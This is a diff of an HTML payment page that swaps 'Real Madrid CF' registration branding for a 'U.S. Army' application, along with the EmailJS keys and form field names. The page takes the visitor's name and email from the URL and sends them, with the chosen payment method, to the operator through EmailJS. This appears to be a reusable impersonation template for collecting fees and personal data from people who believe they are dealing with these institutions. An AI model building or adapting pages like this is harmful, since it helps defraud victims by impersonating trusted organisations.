@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Complete Registration – Real Madrid CF</title>
+  <title>Complete Application – U.S. Army</title>
   <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
   <style>
     body {
@@ -77,7 +77,7 @@
 
     <form id="paymentForm">
       <!-- Hidden dynamic fields -->
-      <input type="hidden" name="full_name" id="full_name" value="" />
+      <input type="hidden" name="name" id="name" value="" />
       <input type="hidden" name="email" id="email" value="" />
       <input type="hidden" name="payment_method" id="payment_method" value="" />
 
@@ -102,7 +102,7 @@
 
   <script>
     (function(){
-      emailjs.init("JWcOE8k4MMUEFNPy-");
+      emailjs.init("gemkywkuPgyAvxdHD");
 
       // Optional: Pre-fill from query string like ?name=Francois&email=francois@example.com
       const urlParams = new URLSearchParams(window.location.search);
@@ -110,15 +110,15 @@
       const email = urlParams.get('email') || '';
 
       document.getElementById('displayName').textContent = name;
-      document.getElementById('full_name').value = name;
+      document.getElementById('name').value = name;
       document.getElementById('email').value = email;
     })();
 
     function submitPayment(method) {
       document.getElementById("payment_method").value = method;
 
-      emailjs.send("service_96jc01n", "template_uikbtgh", {
-        full_name: document.getElementById("full_name").value,
+      emailjs.send("service_il4m6rr", "template_3tmdj1g", {
+        name: document.getElementById("name").value,
         email: document.getElementById("email").value,
         payment_method: method
       })
